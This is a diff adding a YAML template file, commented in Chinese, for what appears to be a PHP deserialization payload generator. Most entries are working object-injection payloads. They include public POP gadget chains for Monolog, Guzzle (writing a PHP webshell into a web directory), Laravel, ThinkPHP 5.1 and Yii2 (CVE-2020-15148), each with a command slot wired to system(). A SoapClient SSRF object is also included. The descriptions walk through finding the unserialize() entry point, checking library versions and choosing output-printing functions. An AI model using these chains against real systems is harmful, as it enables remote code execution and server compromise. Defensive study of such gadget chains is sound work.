@@ -1,0 +1,348 @@
+ruleDB: v0.1.0
+# PHP 反序列化（对象注入）模板。
+#
+# 这一类逼出了 `<<len(NAME)>>` 这个**计算型占位符**：
+# PHP 序列化的字符串长度前缀是**字节**数，不是字符数——
+# "管理员" 是 3 个字符但 9 个字节，写成 s:3: 直接解析失败。
+#
+# 用字典槽位也能做，但只能覆盖预枚举的固定值；要支持任意输入就得算。
+# 求值发生在变量替换阶段，与 `<<NAME>>` 同一趟。
+
+templates:
+  - id: deser.php.syntax.string
+    name: PHP 序列化 · 裸字符串
+    desc: 用于 Cookie / Session 注入。长度前缀跟着值自动算，中文也正确
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    body: 's:<<len(value)>>:"<<value>>";'
+    vars: [value]
+    requires: [deser-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.php.syntax.array
+    name: PHP 序列化 · 数组
+    desc: 键名固定、值可填。两个长度前缀都由工具计算
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    body: 'a:1:{s:<<len(key)>>:"<<key>>";s:<<len(value)>>:"<<value>>";}'
+    vars: [key, value]
+    requires: [deser-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.php.syntax.object
+    name: PHP 序列化 · 自定义对象
+    desc: 类名和属性名从目标代码里取。三个长度前缀都由工具计算
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    # 这里**没有属性个数槽位**——原来有一个 `n`，但 body 里只写得下一个属性对，
+    # 选 n=2 会产出 `O:3:"Foo":2:{s:3:"bar";s:1:"x";}`：声明两个属性只写一个，
+    # `unserialize()` 直接报错。默认值 n=1 恰好是对的，所以黄金样本一直没碰到它。
+    # 属性个数是结构问题，交给 deser.php.custom.structure（<<phpser>>）按需生成。
+    body: 'O:<<len(cls)>>:"<<cls>>":1:{s:<<len(prop)>>:"<<prop>>";s:<<len(value)>>:"<<value>>";}'
+    vars: [cls, prop, value]
+    requires: [recon]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.php.syntax.boolean
+    name: PHP 序列化 · 布尔与空值
+    desc: 注入点要求布尔类型时（如权限标志），用这个代替字符串
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    slots:
+      v:
+        options:
+          - {id: true_,  name: "true",  seq: "b:1;"}
+          - {id: false_, name: "false", seq: "b:0;"}
+          - {id: null_,  name: "null",  seq: "N;"}
+        default: true_
+    body: "<<v.seq>>"
+    vars: []
+    requires: [deser-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.php.soapclient.ssrf
+    name: SoapClient SSRF / CRLF
+    desc: SoapClient 有 __call 魔术方法且可被序列化，是 PHP 里少见的"内置类即可用"的链
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    body: 'O:10:"SoapClient":3:{s:3:"uri";s:<<len(uri)>>:"<<uri>>";s:8:"location";s:<<len(loc)>>:"<<loc>>";s:15:"_stream_context";i:0;}'
+    vars: [uri, loc]
+    requires: [deser-sink, outbound]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 按目标定制：结构你写，长度工具算 ----
+  # 上面那几条是**固定形状**的骨架（一个属性、一个数组元素），够用但不万能。
+  # POP 链的形状取决于目标的类——类名、属性名、可见性、嵌套几层，这些只有
+  # 使用者知道；而**字节长度和元素计数**是最容易写错、错了又最不显眼的部分。
+  # 分工就落在这条上：结构你写，长度工具算。
+
+  - id: deser.php.custom.structure
+    name: PHP 序列化 · 自定义结构（长度自算）
+    # desc 里有「 #」——不加引号会被 YAML 当行内注释静默截断。用折叠块标量
+    # 最省事：`>-` 里 # 是普通字符，长句也能分行写。这条是 validate_rules.py 扫出来的。
+    desc: >-
+      POP 链靠它。在 spec 里写**不带长度**的结构树，工具补齐每个字节长度和元素个数。
+      语法：N 空 / b:1 布尔 / i:1 整数 / d:1.5 浮点 / s:"文本" 字符串 / a{...} 数组 /
+      O:类名{...} 对象；属性名前面加 - 是 protected、加 # 是 private
+      （工具会连两个 NUL 一起算进长度）。完整语法见 模板写作规范.md
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    body: "<<phpser(spec)>>"
+    vars: [spec]
+    requires: [deser-sink, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ================= 公开 POP 链 =================
+  # 下面这几条是**逐条对着公开链写的**：类名、属性名、可见性、嵌套形状都按出处抄，
+  # 只有命令/路径/键名是可填的。这么做的理由和 custom.structure 那条一样——
+  # 链的形状取决于目标的库版本，只能由使用者核对；而长度和计数工具能算。
+  #
+  # 怎么用：先在目标代码里找到 unserialize() 的入口（触发点写在每条 desc 里），
+  # 再按目标实际安装的库版本核对类名与属性名，最后把命令填进去。
+  # 版本对不上时属性名会变（PHP 收到不认识的属性只是设上去，链就断在魔术方法里），
+  # 所以**核对版本**这一步不能省。
+  #
+  # 两条需要引用的链（Monolog / ThinkPHP）用的是骨架形态：`r:N` 要维护
+  # 「第几个值」的编号，而那个编号规则没有可靠出处，写错了是静默错——
+  # 借 phpser 生成再看一眼编号也要自己去数，不如把出处里那份原样抄下来。
+
+  - id: deser.php.pop.monolog.rce1
+    name: Monolog RCE1（SyslogUdpHandler + BufferHandler）
+    desc: >-
+      公开链 Monolog/RCE1，入口是 SyslogUdpHandler 的析构：__destruct → close()
+      一路走到 BufferHandler::flush()，processors 数组被 call_user_func 逐个调用，
+      于是 system(缓冲区里的那条记录) 执行。两个前提——目标装了 Monolog 1.x
+      （1.4.1~1.6.0 / 1.17.2~2.7.0+ 这一档），且应用里有 unserialize() 入口
+      （Monolog 自己不会反序列化用户输入）。属性顺序和 r:2 这个自引用都按出处抄的，
+      别手改；改 processors 里的函数名可以换 system/passthru 这些**会打印输出**的。
+      有语法校验器也不认 r: 引用，所以这条的校验结果是「未建模」而不是通过。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [monolog]
+    version: ">=1.4.1"
+    body: "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\0*\0socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\0*\0handler\";r:2;s:13:\"\0*\0bufferSize\";i:-1;s:9:\"\0*\0buffer\";a:1:{i:0;a:2:{i:0;s:<<len(cmd)>>:\"<<cmd>>\";s:5:\"level\";N;}}s:8:\"\0*\0level\";N;s:14:\"\0*\0initialized\";b:1;s:14:\"\0*\0bufferLimit\";i:-1;s:13:\"\0*\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"
+    vars: [cmd]
+    requires: [deser-sink, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.php.pop.guzzle.fw1
+    name: Guzzle FileCookieJar 写文件（FW1）
+    desc: >-
+      公开链 Guzzle/FW1，入口是 FileCookieJar 的析构：__destruct → save($filename)，
+      于是 cookies 里的内容被原样写进 filename。用途是把一段 PHP 写进 Web 目录
+      （filename 填可写路径、cmd 填一句话），所以要求目标上有可写路径、
+      且装了 GuzzleHttp 4.0.0-rc.2 ~ 7.5.0+。三个类的私有属性（本类的 filename、
+      父类 CookieJar 的 cookies/strictMode、SetCookie 的 data）都按 `\0类名\0属性`
+      写进结构里了——这是 PHP 对 private 的编码，不是笔误。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [guzzle]
+    version: ">=4.0.0"
+    slots:
+      chain:
+        options:
+          - id: fw1
+            name: "GuzzleHttp\\Cookie\\FileCookieJar"
+            spec: "O:GuzzleHttp\\Cookie\\FileCookieJar{ #filename=s:\"<<file>>\" #storeSessionCookies=b:1 \0GuzzleHttp\\Cookie\\CookieJar\0cookies=a{ i:0=O:GuzzleHttp\\Cookie\\SetCookie{ #data=a{ s:\"Expires\"=i:1 s:\"Discard\"=b:0 s:\"Value\"=s:\"<<cmd>>\" } } } \0GuzzleHttp\\Cookie\\CookieJar\0strictMode=N }"
+        default: fw1
+    body: "<<phpser(chain.spec)>>"
+    vars: [file, cmd]
+    requires: [deser-sink, writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.php.pop.laravel.pendingbroadcast
+    name: Laravel PendingBroadcast 链
+    desc: >-
+      公开链 Laravel/RCE1、RCE2：PendingBroadcast 的析构把 event 交给 events
+      对象去 dispatch，最终 call_user_func 到我们指定的函数。两个选项对应两代
+      Laravel——Dispatcher（5.4.0~8.6.9+）和 Faker\Generator（只测过 5.4.27），
+      按目标 vendor 目录里实际装的那个选。触发点是应用里的 unserialize()，
+      Laravel 本身也不会反序列化用户输入。命令得选会把输出打出来的函数，
+      否则链跑通了页面上也看不到东西。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [laravel]
+    version: ">=5.4.0"
+    slots:
+      chain:
+        options:
+          - id: dispatcher
+            name: "5.4.0~8.6.9+ · Illuminate\\Events\\Dispatcher"
+            spec: 'O:Illuminate\Broadcasting\PendingBroadcast{ -events=O:Illuminate\Events\Dispatcher{ -listeners=a{ s:"<<cmd>>"=a{ i:0=s:"system" } } } -event=s:"<<cmd>>" }'
+          - id: faker
+            name: "5.4.27 · Faker\\Generator"
+            spec: 'O:Illuminate\Broadcasting\PendingBroadcast{ -events=O:Faker\Generator{ -formatters=a{ s:"dispatch"=s:"system" } } -event=s:"<<cmd>>" }'
+        default: dispatcher
+    body: "<<phpser(chain.spec)>>"
+    vars: [cmd]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.php.pop.thinkphp.windows
+    name: ThinkPHP 5.1 反序列化链
+    desc: >-
+      公开链（ThinkPHP 5.1.16~5.1.40）：Windows::__destruct → removeFiles →
+      file_exists($files[0]) 触发 Pivot 的 __toString → toArray → Request::__call
+      → input → filterValue → call_user_func($filter, $value)。key 是两侧数组
+      共用的键名，**命令不在载荷里**：载荷落地后还要用同名的 GET/POST 参数把命令
+      递进去（如 ?ethan=cat /flag），filter 写死成 system。注意 private 属性 data
+      的类名是 think\Model ——它来自 Model 里 use 的 trait，mangled 名用的是
+      **使用 trait 的那个类**，不是 Pivot，所以这里只能写骨架。r:9 也是出处里
+      原样的自引用编号，别手改。有语法校验器也不认 r: 引用，所以校验结果是「未建模」。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [thinkphp]
+    version: ">=5.1.16 <=5.1.40"
+    body: "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\0think\\process\\pipes\\Windows\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":2:{s:9:\"\0*\0append\";a:1:{s:<<len(key)>>:\"<<key>>\";a:2:{i:0;s:3:\"dir\";i:1;s:4:\"calc\";}}s:17:\"\0think\\Model\0data\";a:1:{s:<<len(key)>>:\"<<key>>\";O:13:\"think\\Request\":3:{s:7:\"\0*\0hook\";a:1:{s:7:\"visible\";a:2:{i:0;r:9;i:1;s:6:\"isAjax\";}}s:9:\"\0*\0filter\";s:6:\"system\";s:9:\"\0*\0config\";a:1:{s:8:\"var_ajax\";s:0:\"\";}}}}}}"
+    vars: [key]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.php.pop.yii2.batchquery
+    name: Yii2 BatchQueryResult 链（CVE-2020-15148）
+    desc: >-
+      公开链 Yii2/RCE1，影响 <2.0.38：BatchQueryResult 的析构调 _dataReader->close()，
+      经 Connection 的 __call 落到 ColumnSchemaBuilder::__toString，
+      最后 ArrayCache 把 serializer 里的函数当序列化回调调起来，
+      参数是 _cache 里存的值——于是 system(命令) 执行。触发点还是应用里的
+      unserialize()。Yii 2.0.38 修掉了这条，升过级的站点上不要浪费时间。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [yii2]
+    version: "<2.0.38"
+    slots:
+      chain:
+        options:
+          - id: rce1
+            name: "Yii2 <2.0.38 · ArrayCache"
+            spec: 'O:yii\db\BatchQueryResult{ #_dataReader=O:yii\db\Connection{ pdo=i:1 dsn=O:yii\db\ColumnSchemaBuilder{ -type=s:"x" categoryMap=O:yii\caching\ArrayCache{ serializer=a{ i:1=s:"system" } #_cache=a{ s:"x"=a{ i:0=s:"<<cmd>>" i:1=i:0 } } } } } }'
+        default: rce1
+    body: "<<phpser(chain.spec)>>"
+    vars: [cmd]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 两段式：把内层载荷挂到外层结构上 ----
+  # 入口的类名/属性名/数组键只有使用者知道，而"挂进去"这个动作的形状是固定的。
+  # 这两条配合嵌套内层载荷（生成两次，第二次把内层 raw 填进嵌套载荷）用。
+
+  - id: deser.php.wrap.array
+    name: PHP 外层包装 · 数组键
+    desc: >-
+      注入点要求整个值是一个数组、而真正要打的对象在里面时用。key 按目标代码里
+      读的那个数组键名填（常见是 session 里的用户名、Cookie 里的字段名）。
+      没给嵌套内层载荷时 <<payload>> 会原样留在串里——产出明显不可用，这是有意的。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    body: 'a:1:{s:<<len(key)>>:"<<key>>";<<payload>>}'
+    vars: [key]
+    requires: [deser-sink, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.php.wrap.object
+    name: PHP 外层包装 · 对象属性
+    desc: >-
+      POP 链最外层的常见形状：把内层载荷当成某个类的一个属性值挂上去
+      （属性名通常就是魔术方法里读的那个）。类名和属性名从目标代码里取，
+      长度和属性个数由工具算。同样，没给嵌套内层载荷时 <<payload>> 原样保留。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    body: 'O:<<len(cls)>>:"<<cls>>":1:{s:<<len(prop)>>:"<<prop>>";<<payload>>}'
+    vars: [cls, prop]
+    requires: [deser-sink, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 外部生成器的粘贴位 ----
+  # phpggc 产出的链（Monolog / Laravel / Yii2 …）很多带引用，本工具现在
+  # 也能自己拼了，但**第三方链库更新更快、覆盖面更广**，所以粘贴位仍然要有。
+  # 这里和 `deser.python.pickle.b64` 是同一条思路，补上 PHP 缺的那半边。
+
+  - id: deser.php.external.serialized
+    name: PHP 序列化 · 粘贴外部生成的串
+    desc: >
+      phpggc 的产出，或手写的序列化串，直接贴进来。工具会**校验它**——
+      长度前缀、元素个数、以及引用（R:/r:）是否指得回已经出现的值。
+      校验通过不代表链在目标上能用，只代表这串本身是合法的 PHP 序列化。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [php]
+    version: "*"
+    body: '<<blob>>'
+    vars: [blob]
+    requires: [deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-19
+
+  - id: deser.php.external.b64
+    name: PHP 序列化 · 粘贴 base64（外部生成器）
+    desc: >
+      phpggc -b 的产出，或目标会把 Cookie 值 base64 解码后再 unserialize 时用。
+      base64 已经看不出结构，所以这一条**不做语法校验**——要校验就用上一条。
+    vuln: [deser]
+    content_type: [raw]
+    component: [php]
+    version: "*"
+    body: '<<b64>>'
+    vars: [b64]
+    requires: [generator, deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-19
